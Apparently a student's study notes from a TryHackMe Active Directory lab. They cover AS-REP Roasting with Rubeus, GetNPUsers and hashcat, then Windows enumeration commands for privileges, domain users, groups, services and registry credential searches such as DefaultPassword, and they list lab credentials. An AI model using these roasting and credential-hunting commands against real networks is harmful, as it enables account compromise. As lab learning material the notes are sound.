https://tryhackme.com/room/adauthenticatedenumeration

### Table of contents
- [[#AS-REP Roasting]]
- [[#Manual Enumeration]]
	- [[#1. `whoami`]]
	- [[#2. **Check Your Privileges**]]
	- [[#3. System & Domain Info]]
	- [[#4. Enumerate Users & Groups]]
	- [[#5. Identify Service Accounts]]
	- [[#6. Environment & Registry]]
- [[#Bloodhound]]

___
### AS-REP Roasting
[[#Table of contents|Back to the top]]

1. **Enumeration** – Identify Vulnerable Accounts

Accounts that have Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH` flag is set) --> anyone can request Kerberos ticket (specifically AS-REP) --> account passwords encrypted hashes exposed

[Rubeus](https://github.com/GhostPack/Rubeus) (Windows only)
e.g. : `Rubeus.exe asreproast`

[Impacket’s GetNPUsers.py](https://github.com/fortra/impacket) (Linux/Windows)
e.g. : `GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`

2. **Exploitation** - Password Hashes Cracking & Network Access

[Hashcat](https://hashcat.net/hashcat/)

For AS-REP, use 18200 mode
e.g. : `hashcat -m 18200 hashes.txt wordlist.txt`


**Mitigation**
- Enforce pre-authentication
- Strong, complex paswords
- Monitor anomalous AS-REP requests on KDC

___
### Manual Enumeration
[[#Table of contents|Back to the top]]

##### 1. `whoami`

Credentials: asrepuser1:qwerty123!
`ssh asrepuser1@10.211.12.20`

`whoami` (username, domain/pc name), `whoami /all` (groups, privileges, SID)

##### 2. **Check Your Privileges**

- **`SeImpersonatePrivilege`**: impersonate other user's security context after authentication (--> potato attack)
- **`SeAssignPrimaryTokenPrivilege`**: assign other user's primary token to a new process, used in conjunction with SeImpersonatePrivilege
- **`SeBackupPrivilege`**: read any file on system, ignoring file permissions (--> dump sensitive files like SAM or SYSTEM hive)
- **`SeRestorePrivilege`**: write to any file or registry key, ignoring file permissions
- **`SeDebugPrivilege`**: attach a debugger to any process (--> dump memory from LSASS, extract credentials, inject malicious code into privileged processes)

##### 3. System & Domain Info
*Is machine part of AD domain? Hostname, domain, workgroup?*

**`hostname`** --> common for DCs to have "dc" in their hostname, "pc-\[digits]" for pcs joined to domain

**`systeminfo`**: OS version, installed hotfixes, domain & workgroup info
- `systeminfo | findstr /B "OS"`
- `systeminfo | findstr /B "Domain"`

**`set`**: discover info in environment variables (in PowerShell: `Get-ChildItem Env:`/`dir env:`)

##### 4. Enumerate Users & Groups

**`NET`**
`net help`: display all available commands

**Users**
`net user`: queries computer for local accounts
`net user /domain`: queries DC for list of all domain user accounts
`net user <username> /domain`: more info about specific account

**Groups**
`net group /domain`
`net group <group_name> /domain`: discover names of computers on domain
`net localgroup`: lists only local groups
`net localgroup <group_name>`: lists members of specific local group

Most interesting domain groups
- Domain Admins / Administrators
- Enterprise Admins --> multi domain forests
- Server Operators / Backup Operators
- Any group with "Admin" in its name

**Sessions**
`quser`/`query user`: lists logged on users
--> finding an admin that way is big --> could lead to finding their credentials (--> LSASS dump / Kerberos ticket / impersonate session token with `SeImpersonatePrivilege` account)
Require elevated privilege:
`tasklist`: list of running processes (`/V`: verbose mode)
`net session`: list SMB sessions between computer and other computers (admin privilege to run)

##### 5. Identify Service Accounts
*not human, used by app/service, have privilege to get the job done but could still be high*

**`WMIC`**
`wmic service get`
`wmic service get Name, StartName`: name and associated account (admin privilege to run)
--> if service has `DomainName\username` StartName --> could be interesting because it could be reused elsewhere, could have weak password
(PS equivalent: `Get-WmiObject Win32_Service | select Name, StartName`)

**`SC`**: communicates with Service Control Manager
`sc query state= all`: list all services (admin privilege to run)
`sc query state= all | find "Keyword"`: filter
`sc qc <service_name>`: more info about service, including StartName

##### 6. Environment & Registry
*persistent system configuration: environment variables and Windows Registry*

**Saved Auto-Logon Credentials**
`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v <search_word>` ("search_word" --> "DefaultPassword","DefaultUsername")

`HKLM\Security\Cache` (admin privilege to access) --> hashed passwords

**Installed apps**
`reg query reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`: list installed apps

**Registry Search**
`reg query HKLM /f "password" /t REG_SZ /s`

**Scheduled Tasks**
`schtasks /query`, `schtasks /create`, `schtasks <task_name> /run`

___
### Bloodhound
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
